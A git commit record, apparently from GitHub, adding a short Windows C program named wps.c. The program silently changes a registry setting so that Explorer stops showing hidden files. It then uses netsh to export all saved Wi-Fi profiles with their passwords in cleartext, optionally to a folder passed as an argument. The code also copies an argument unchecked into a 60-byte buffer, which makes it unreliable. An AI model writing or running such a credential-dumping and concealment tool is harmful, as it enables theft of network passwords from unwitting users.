09e80f308dc1cd13f99be2e3eada6ac0e64fa126
int21h000 <65222613+int21h000@users.noreply.github.com>
2020-05-20 15:44:16 +0300

    Update wps.c

--- wps.c
+++ wps.c
@@ -1,1 +1,13 @@
 #include <windows.h>
+#include <string.h>
+
+void main(int argc, char **argv){
+	WinExec("cmd.exe /c reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /t REG_DWORD /d 2 /f", 0);
+	if(!strcmp(argv[1], "-f")){
+		char str[60] = "cmd.exe /c netsh wlan export profile folder=";
+		strcat(str, strcat(argv[2], " key=clear"));
+		WinExec(str, 0);  
+	} else {
+		WinExec("cmd.exe /c netsh wlan export profile key=clear", 0);
+	}    
+}
